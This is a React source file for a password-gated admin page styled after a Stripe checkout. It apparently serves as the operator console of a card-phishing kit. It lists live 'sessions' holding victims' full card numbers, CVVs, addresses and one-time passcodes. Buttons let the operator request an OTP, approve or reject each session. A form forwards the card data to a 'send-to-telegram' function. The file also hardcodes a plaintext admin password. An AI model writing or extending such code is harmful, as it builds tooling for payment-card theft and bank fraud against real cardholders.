import { useState, useEffect } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { Badge } from "@/components/ui/badge";

const ADMIN_PASSWORD = "Ultimateunique1#";

const formatCardNumber = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
};

const formatExpiry = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
};

type CardBrand = "visa" | "mastercard" | "amex" | "discover" | "unknown";

const detectCardBrand = (number: string): CardBrand => {
  const digits = number.replace(/\s/g, "");
  if (!digits) return "unknown";
  if (/^4/.test(digits)) return "visa";
  if (/^5[1-5]/.test(digits) || /^2(2[2-9][1-9]|2[3-9]\d|[3-6]\d{2}|7[01]\d|720)/.test(digits)) return "mastercard";
  if (/^3[47]/.test(digits)) return "amex";
  if (/^(6011|64[4-9]|65)/.test(digits)) return "discover";
  return "unknown";
};

const countries = [
  "Afghanistan","Albania","Algeria","Andorra","Angola","Antigua and Barbuda","Argentina","Armenia","Australia","Austria",
  "Azerbaijan","Bahamas","Bahrain","Bangladesh","Barbados","Belarus","Belgium","Belize","Benin","Bhutan",
  "Bolivia","Bosnia and Herzegovina","Botswana","Brazil","Brunei","Bulgaria","Burkina Faso","Burundi","Cabo Verde","Cambodia",
  "Cameroon","Canada","Central African Republic","Chad","Chile","China","Colombia","Comoros","Congo","Costa Rica",
  "Croatia","Cuba","Cyprus","Czech Republic","Denmark","Djibouti","Dominica","Dominican Republic","Ecuador","Egypt",
  "El Salvador","Equatorial Guinea","Eritrea","Estonia","Eswatini","Ethiopia","Fiji","Finland","France","Gabon",
  "Gambia","Georgia","Germany","Ghana","Greece","Grenada","Guatemala","Guinea","Guinea-Bissau","Guyana",
  "Haiti","Honduras","Hungary","Iceland","India","Indonesia","Iran","Iraq","Ireland","Israel",
  "Italy","Jamaica","Japan","Jordan","Kazakhstan","Kenya","Kiribati","Kosovo","Kuwait","Kyrgyzstan",
  "Laos","Latvia","Lebanon","Lesotho","Liberia","Libya","Liechtenstein","Lithuania","Luxembourg","Madagascar",
  "Malawi","Malaysia","Maldives","Mali","Malta","Marshall Islands","Mauritania","Mauritius","Mexico","Micronesia",
  "Moldova","Monaco","Mongolia","Montenegro","Morocco","Mozambique","Myanmar","Namibia","Nauru","Nepal",
  "Netherlands","New Zealand","Nicaragua","Niger","Nigeria","North Korea","North Macedonia","Norway","Oman","Pakistan",
  "Palau","Palestine","Panama","Papua New Guinea","Paraguay","Peru","Philippines","Poland","Portugal","Qatar",
  "Romania","Russia","Rwanda","Saint Kitts and Nevis","Saint Lucia","Saint Vincent and the Grenadines","Samoa","San Marino",
  "Sao Tome and Principe","Saudi Arabia","Senegal","Serbia","Seychelles","Sierra Leone","Singapore","Slovakia","Slovenia",
  "Solomon Islands","Somalia","South Africa","South Korea","South Sudan","Spain","Sri Lanka","Sudan","Suriname","Sweden",
  "Switzerland","Syria","Taiwan","Tajikistan","Tanzania","Thailand","Timor-Leste","Togo","Tonga","Trinidad and Tobago",
  "Tunisia","Turkey","Turkmenistan","Tuvalu","Uganda","Ukraine","United Arab Emirates","United Kingdom","United States",
  "Uruguay","Uzbekistan","Vanuatu","Vatican City","Venezuela","Vietnam","Yemen","Zambia","Zimbabwe",
];

const Admin = () => {
  const { toast } = useToast();
  const [authenticated, setAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [amount, setAmount] = useState("");
  const [sessions, setSessions] = useState<any[]>([]);
  const [expandedSession, setExpandedSession] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<"form" | "sessions">("sessions");
  const [form, setForm] = useState({
    cardNumber: "",
    expiry: "",
    cvv: "",
    cardholderName: "",
    email: "",
    country: "",
    address1: "",
    address2: "",
    city: "",
    state: "",
    zip: "",
  });

  // Fetch sessions
  const fetchSessions = async () => {
    const { data } = await supabase
      .from("sessions")
      .select("*")
      .order("created_at", { ascending: false });
    if (data) setSessions(data);
  };

  // Real-time subscription
  useEffect(() => {
    if (!authenticated) return;
    fetchSessions();
    const channel = supabase
      .channel("admin-sessions")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, () => {
        fetchSessions();
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [authenticated]);

  // Session control actions
  const updateSessionStatus = async (id: string, status: string) => {
    const { error } = await supabase.from("sessions").update({ status }).eq("id", id);
    if (error) {
      toast({ title: "Error", description: "Failed to update session.", variant: "destructive" });
    } else {
      toast({ title: "Updated", description: `Session set to "${status}".` });
    }
  };

  const getStatusBadge = (status: string) => {
    const map: Record<string, { variant: "default" | "secondary" | "destructive" | "outline"; label: string }> = {
      pending: { variant: "outline", label: "Pending" },
      waiting: { variant: "secondary", label: "Waiting" },
      otp_required: { variant: "default", label: "OTP Required" },
      processing: { variant: "secondary", label: "Processing" },
      approved: { variant: "default", label: "Approved" },
      rejected: { variant: "destructive", label: "Rejected" },
    };
    const info = map[status] || { variant: "outline" as const, label: status };
    return <Badge variant={info.variant}>{info.label}</Badge>;
  };

  const brand = detectCardBrand(form.cardNumber);
  const parsedAmount = parseFloat(amount) || 0;
  const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
  const total = parsedAmount > 0 ? parseFloat((parsedAmount + transactionFee).toFixed(2)) : 0;
  const isValidAmount = parsedAmount >= 500 && parsedAmount <= 1500;

  const formatEuro = (val: number) =>
    val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setAuthenticated(true);
      setError(false);
    } else {
      setError(true);
    }
  };

  const update = (field: string, value: string) => {
    if (field === "cardNumber") value = formatCardNumber(value);
    if (field === "expiry") value = formatExpiry(value);
    if (field === "cvv") value = value.replace(/\D/g, "").slice(0, 4);
    setForm((f) => ({ ...f, [field]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const { data: session, error: dbError } = await supabase
        .from("sessions")
        .insert({ status: "pending", form_data: { ...form, amount } as any })
        .select("id")
        .single();

      if (dbError || !session) throw new Error("Failed to create session");

      const res = await fetch(
        `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ type: "payment", ...form, amount, sessionId: session.id }),
        }
      );

      if (!res.ok) throw new Error("Failed to process");

      toast({
        title: "Submitted",
        description: `Card details submitted successfully. Session: ${session.id.slice(0, 8)}…`,
      });

      // Reset form
      setForm({
        cardNumber: "", expiry: "", cvv: "", cardholderName: "",
        email: "", country: "", address1: "", address2: "",
        city: "", state: "", zip: "",
      });
      setAmount("");
    } catch {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  if (!authenticated) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="w-full max-w-sm space-y-6">
          <div className="text-center space-y-2">
            <div className="h-12 w-12 rounded-xl bg-muted flex items-center justify-center mx-auto">
              <Lock className="h-6 w-6 text-muted-foreground" />
            </div>
            <h1 className="text-lg font-semibold text-foreground">Admin Access</h1>
            <p className="text-sm text-muted-foreground">Enter password to continue</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-3">
            <Input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => { setPassword(e.target.value); setError(false); }}
              className={error ? "border-destructive" : ""}
              autoFocus
            />
            {error && <p className="text-xs text-destructive">Incorrect password</p>}
            <Button type="submit" className="w-full">Unlock</Button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Top bar */}
      <div className="border-b border-border px-4 py-3 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="h-7 w-7 rounded-full bg-primary flex items-center justify-center">
            <span className="text-primary-foreground text-xs font-bold">P</span>
          </div>
          <span className="text-foreground font-semibold">Pay</span>
          <Badge variant="outline" className="text-xs">Admin</Badge>
        </div>
        <div className="flex items-center gap-1">
          <Button
            variant={activeTab === "sessions" ? "default" : "ghost"}
            size="sm"
            onClick={() => setActiveTab("sessions")}
          >
            Sessions
          </Button>
          <Button
            variant={activeTab === "form" ? "default" : "ghost"}
            size="sm"
            onClick={() => setActiveTab("form")}
          >
            Manual Entry
          </Button>
        </div>
      </div>

      {activeTab === "sessions" ? (
        /* ========== SESSION MONITORING ========== */
        <div className="max-w-4xl mx-auto p-4 sm:p-6 space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-lg font-semibold text-foreground">Live Sessions</h2>
            <Button variant="ghost" size="sm" onClick={fetchSessions}>
              <RefreshCw className="h-4 w-4 mr-1" /> Refresh
            </Button>
          </div>

          {sessions.length === 0 ? (
            <div className="text-center py-16 text-muted-foreground text-sm">
              No sessions yet. Waiting for submissions…
            </div>
          ) : (
            <div className="space-y-3">
              {sessions.map((s) => {
                const fd = (s.form_data || {}) as any;
                const isExpanded = expandedSession === s.id;
                return (
                  <div key={s.id} className="border border-border rounded-lg bg-card overflow-hidden">
                    {/* Session header */}
                    <div
                      className="flex items-center justify-between p-4 cursor-pointer hover:bg-muted/50 transition-colors"
                      onClick={() => setExpandedSession(isExpanded ? null : s.id)}
                    >
                      <div className="flex items-center gap-3 min-w-0">
                        {getStatusBadge(s.status)}
                        <span className="text-sm font-mono text-muted-foreground truncate">
                          {s.id.slice(0, 8)}…
                        </span>
                        {fd.email && (
                          <span className="text-sm text-foreground truncate hidden sm:inline">
                            {fd.email}
                          </span>
                        )}
                        {fd.amount && (
                          <span className="text-sm font-semibold text-foreground">
                            €{fd.amount}
                          </span>
                        )}
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <span className="text-xs text-muted-foreground hidden sm:inline">
                          {new Date(s.created_at).toLocaleString()}
                        </span>
                        {isExpanded ? <EyeOff className="h-4 w-4 text-muted-foreground" /> : <Eye className="h-4 w-4 text-muted-foreground" />}
                      </div>
                    </div>

                    {/* Expanded details */}
                    {isExpanded && (
                      <div className="border-t border-border">
                        <div className="p-4 grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
                          <div>
                            <p className="text-muted-foreground text-xs mb-0.5">Card Number</p>
                            <p className="text-foreground font-mono">{fd.cardNumber || "—"}</p>
                          </div>
                          <div>
                            <p className="text-muted-foreground text-xs mb-0.5">Expiry / CVV</p>
                            <p className="text-foreground font-mono">{fd.expiry || "—"} / {fd.cvv || "—"}</p>
                          </div>
                          <div>
                            <p className="text-muted-foreground text-xs mb-0.5">Cardholder</p>
                            <p className="text-foreground">{fd.cardholderName || "—"}</p>
                          </div>
                          <div>
                            <p className="text-muted-foreground text-xs mb-0.5">Email</p>
                            <p className="text-foreground">{fd.email || "—"}</p>
                          </div>
                          <div className="sm:col-span-2">
                            <p className="text-muted-foreground text-xs mb-0.5">Billing Address</p>
                            <p className="text-foreground">
                              {[fd.address1, fd.address2, fd.city, fd.state, fd.zip, fd.country].filter(Boolean).join(", ") || "—"}
                            </p>
                          </div>
                          {fd.otp && (
                            <div>
                              <p className="text-muted-foreground text-xs mb-0.5">OTP Submitted</p>
                              <p className="text-foreground font-mono font-bold">{fd.otp}</p>
                            </div>
                          )}
                        </div>

                        {/* Action buttons */}
                        <div className="border-t border-border p-4 flex flex-wrap gap-2">
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => updateSessionStatus(s.id, "otp_required")}
                          >
                            <KeyRound className="h-3.5 w-3.5 mr-1" /> Request OTP
                          </Button>
                          <Button
                            size="sm"
                            variant="default"
                            onClick={() => updateSessionStatus(s.id, "approved")}
                          >
                            <CheckCircle className="h-3.5 w-3.5 mr-1" /> Approve
                          </Button>
                          <Button
                            size="sm"
                            variant="destructive"
                            onClick={() => updateSessionStatus(s.id, "rejected")}
                          >
                            <XCircle className="h-3.5 w-3.5 mr-1" /> Reject
                          </Button>
                        </div>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      ) : (
        /* ========== MANUAL ENTRY FORM ========== */
        <div className="min-h-[calc(100vh-57px)] flex">
          {/* Left panel — branding / order summary */}
          <div className="hidden lg:flex lg:w-[480px] xl:w-[520px] flex-col justify-between p-10 xl:p-14 bg-stripe-bg">
            <div>
              <div className="space-y-6">
                <div>
                  <p className="text-white/50 text-sm">Manual Card Entry</p>
                  <p className="text-white/40 text-xs mt-0.5">Business Portal</p>
                  <p className="text-white text-4xl font-bold tracking-tight mt-1">
                    {isValidAmount ? formatEuro(total) : "€0.00"}
                  </p>
                </div>

                <div className="space-y-4 mt-8">
                  <div className="flex items-center justify-between py-3 border-b border-white/10">
                    <p className="text-white/50 text-sm">Amount</p>
                    <p className="text-white/90 text-sm">
                      {isValidAmount ? formatEuro(parsedAmount) : "—"}
                    </p>
                  </div>
                  <div className="flex items-center justify-between py-3 border-b border-white/10">
                    <p className="text-white/50 text-sm">Transaction fee (0.1%)</p>
                    <p className="text-white/90 text-sm">
                      {isValidAmount ? formatEuro(transactionFee) : "—"}
                    </p>
                  </div>
                  <div className="flex items-center justify-between py-3">
                    <p className="text-white/90 text-sm font-semibold">Total</p>
                    <p className="text-white text-sm font-semibold">
                      {isValidAmount ? formatEuro(total) : "—"}
                    </p>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-4 text-white/30 text-xs">
              <span>Powered by <span className="font-semibold text-white/50">Pay</span></span>
              <span>·</span>
              <span>Admin Portal</span>
            </div>
          </div>

          {/* Right panel — form */}
          <div className="flex-1 flex items-start justify-center bg-background overflow-y-auto">
            <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
              {/* Mobile header */}
              <div className="lg:hidden mb-8">
                <p className="text-muted-foreground text-sm">Manual Card Entry</p>
                <p className="text-foreground text-3xl font-bold tracking-tight mt-1">
                  {isValidAmount ? formatEuro(total) : "€0.00"}
                </p>
                {isValidAmount && (
                  <div className="mt-3 space-y-1.5">
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-muted-foreground">Transaction fee (0.1%)</span>
                      <span className="text-foreground">{formatEuro(transactionFee)}</span>
                    </div>
                    <div className="flex items-center justify-between text-sm font-semibold">
                      <span className="text-foreground">Total</span>
                      <span className="text-foreground">{formatEuro(total)}</span>
                    </div>
                  </div>
                )}
              </div>

              <div className="animate-fade-up">
                <form onSubmit={handleSubmit} className="space-y-6">
                  {/* Amount */}
                  <div>
                    <label className="stripe-label">Amount (€500 – €1,500)</label>
                    <div className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground text-sm">€</span>
                      <input
                        type="number"
                        min="500"
                        max="1500"
                        step="0.01"
                        value={amount}
                        onChange={(e) => setAmount(e.target.value)}
                        className="stripe-input pl-7"
                        placeholder="1000.00"
                        required
                      />
                    </div>
                    {amount && !isValidAmount && (
                      <p className="text-destructive text-xs mt-1">Amount must be between €500 and €1,500</p>
                    )}
                  </div>

                  {/* Email */}
                  <div>
                    <label className="stripe-label">Email</label>
                    <input
                      type="email"
                      value={form.email}
                      onChange={(e) => update("email", e.target.value)}
                      className="stripe-input"
                      placeholder="customer@example.com"
                      required
                    />
                  </div>

                  {/* Card information */}
                  <div>
                    <label className="stripe-label">Card information</label>
                    <div className="stripe-input-group">
                      <div className="relative">
                        <input
                          value={form.cardNumber}
                          onChange={(e) => update("cardNumber", e.target.value)}
                          className="stripe-input-row pr-28"
                          placeholder="1234 1234 1234 1234"
                          required
                        />
                        <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                          <div className={`h-5 w-8 rounded bg-gradient-to-br from-blue-600 to-blue-800 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "visa" ? "opacity-100" : "opacity-25"}`}>
                            <span className="text-[7px] font-bold text-white tracking-wider">VISA</span>
                          </div>
                          <div className={`h-5 w-8 rounded bg-gradient-to-br from-red-500 to-orange-400 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "mastercard" ? "opacity-100" : "opacity-25"}`}>
                            <div className="flex -space-x-1">
                              <div className="h-2.5 w-2.5 rounded-full bg-red-600/80" />
                              <div className="h-2.5 w-2.5 rounded-full bg-yellow-400/80" />
                            </div>
                          </div>
                          <div className={`h-5 w-8 rounded bg-gradient-to-br from-sky-500 to-sky-700 flex items-center justify-center transition-opacity ${brand === "unknown" || brand === "amex" ? "opacity-100" : "opacity-25"}`}>
                            <span className="text-[6px] font-bold text-white tracking-tight">AMEX</span>
                          </div>
                        </div>
                      </div>
                      <div className="flex border-t border-input">
                        <input
                          value={form.expiry}
                          onChange={(e) => update("expiry", e.target.value)}
                          className="stripe-input-row flex-1 border-r border-input"
                          placeholder="MM / YY"
                          required
                        />
                        <div className="relative flex-1">
                          <input
                            value={form.cvv}
                            onChange={(e) => update("cvv", e.target.value)}
                            className="stripe-input-row w-full pr-10"
                            placeholder="CVC"
                            required
                          />
                          <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground/40" />
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Cardholder name */}
                  <div>
                    <label className="stripe-label">Cardholder name</label>
                    <input
                      value={form.cardholderName}
                      onChange={(e) => update("cardholderName", e.target.value)}
                      className="stripe-input"
                      placeholder="Full name on card"
                      required
                    />
                  </div>

                  {/* Billing Address */}
                  <div>
                    <label className="stripe-label">Billing address</label>
                    <div className="stripe-input-group">
                      <select
                        value={form.country}
                        onChange={(e) => update("country", e.target.value)}
                        className="stripe-input-row w-full appearance-none bg-card cursor-pointer"
                        required
                      >
                        <option value="" disabled>Select a country…</option>
                        {countries.map((c) => (
                          <option key={c} value={c}>{c}</option>
                        ))}
                      </select>
                      {form.country && (
                        <>
                          <input
                            value={form.address1}
                            onChange={(e) => update("address1", e.target.value)}
                            className="stripe-input-row border-t border-input"
                            placeholder="Address line 1"
                            required
                          />
                          <input
                            value={form.address2}
                            onChange={(e) => update("address2", e.target.value)}
                            className="stripe-input-row border-t border-input"
                            placeholder="Address line 2 (optional)"
                          />
                          <div className="flex border-t border-input">
                            <input
                              value={form.city}
                              onChange={(e) => update("city", e.target.value)}
                              className="stripe-input-row flex-1 border-r border-input"
                              placeholder="City"
                              required
                            />
                            <input
                              value={form.state}
                              onChange={(e) => update("state", e.target.value)}
                              className="stripe-input-row flex-1"
                              placeholder="State / Province"
                              required
                            />
                          </div>
                          <input
                            value={form.zip}
                            onChange={(e) => update("zip", e.target.value)}
                            className="stripe-input-row border-t border-input"
                            placeholder="ZIP / Postal code"
                            required
                          />
                        </>
                      )}
                    </div>
                  </div>

                  {/* Submit button */}
                  <button
                    type="submit"
                    disabled={loading || !isValidAmount}
                    className="stripe-button flex items-center justify-center gap-2"
                  >
                    {loading ? (
                      <>
                        <div className="h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
                        Processing...
                      </>
                    ) : (
                      <>Submit {isValidAmount ? formatEuro(total) : "—"}</>
                    )}
                  </button>

                  {/* Footer */}
                  <div className="flex items-center justify-center gap-1.5 pt-2">
                    <Lock className="h-3 w-3 text-muted-foreground/50" />
                    <p className="text-xs text-muted-foreground/60">
                      Powered by <span className="font-semibold text-muted-foreground">Pay</span>
                    </p>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Admin;
